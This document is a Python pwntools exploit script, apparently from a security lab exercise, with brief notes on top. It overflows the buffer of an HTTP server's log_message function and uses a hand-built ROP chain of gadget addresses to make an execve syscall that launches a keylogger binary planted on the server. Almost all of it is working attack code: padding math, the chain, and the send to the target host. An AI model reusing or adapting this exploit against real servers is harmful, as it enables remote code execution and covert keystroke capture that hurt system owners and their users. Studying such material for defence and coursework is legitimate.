'''
### FINDINGS ###
Use the same approach as in scenario_1 to exploit the server. 
Because DES we can't run the shellcode directly, we need to use a ROP chain to replace this shellcode.
The ROP chain will execute the 'execve' system call to run the keylog binary.
This ROP chain starts at the return address of log_message and goes up the stack.

A problem was the increment of rax to 59, which resulted in to many bytes in the buffer.
To fix this we just put 59 on the stack and load it into rax using a pop before the syscall.
Another problem was that the ./keylogger name was larger than rsi (64 bits), so we named it keylog.

### EXPLOIT SUMMARY ###
1. Copy the 'keylogger' binary to 'server_data'
2. Send a GET request that overflow the buffer of log_message as in scenario_1 and put the first instruction of the ROP chain on the return address
3. Exploited
'''

from keystone import *
from pwn import *
from struct import pack

### CONFIGS ###
host = "192.168.1.4"
port = 8086
original_rbp = 0x7ffff7ad1920 
log_buffer_rbp_offset = 0x450 
log_buffer_prefix = 49 

input("Copy the 'keylogger' binary to 'server_data'. Input anything to continue...")
message_prefix = b"GET /data.txt HTTP/1.1\r\n"
message_prefix_len = len(message_prefix)

### CREATE THE CRASH PAYLOAD ###
crash = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - len(crash) 
crash += b"q" * padding_size 
crash += 0xffffffffffffffff.to_bytes(8, "little") 
crash += b"\r\n\r\n"

keylogger_name = b'./keylog'
p = b''
p += pack('<Q', 0x00000000004036da) # pop rdx ; pop rax ; ret  
p += pack('<Q', 0x0000000000406230) # @ .data
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036db) # pop rax ; ret
p += keylogger_name
p += pack('<Q', 0x00000000004036d6) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x00000000004036da) # pop rdx ; pop rax ; ret  
p += pack('<Q', 0x0000000000406238) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036dd) # xor rax, rax ; ret       
p += pack('<Q', 0x00000000004036d6) # mov qword ptr [rdx], rax ; ret
p += pack('<Q', 0x000000000040398b) # pop rdi ; ret
p += pack('<Q', 0x0000000000406230) # @ .data
p += pack('<Q', 0x00000000004028ac) # pop rsi ; pop rbp ; ret  
p += pack('<Q', 0x0000000000406238) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036da) # pop rdx ; pop rax ; ret  
p += pack('<Q', 0x0000000000406238) # @ .data + 8
p += pack('<Q', 0x4141414141414141) # padding
p += pack('<Q', 0x00000000004036dd) # xor rax, rax ; ret       
p += pack('<Q', 0x00000000004036db) # pop rax ; ret
p += pack("<Q", 0x000000000000003b) # syscall number (59) for rax
p += pack("<Q", 0x00000000004036fb) # syscall

rop_exploit = message_prefix
padding_size = log_buffer_rbp_offset + 8 - log_buffer_prefix - message_prefix_len
rop_exploit += b"q" * padding_size
rop_exploit += p
rop_exploit += b"\r\n\r\n"

### PERFORM ATTACK ###
#remote("localhost", port).send(crash) # send crash payload
# sleep(2)
remote(host, port).send(rop_exploit)
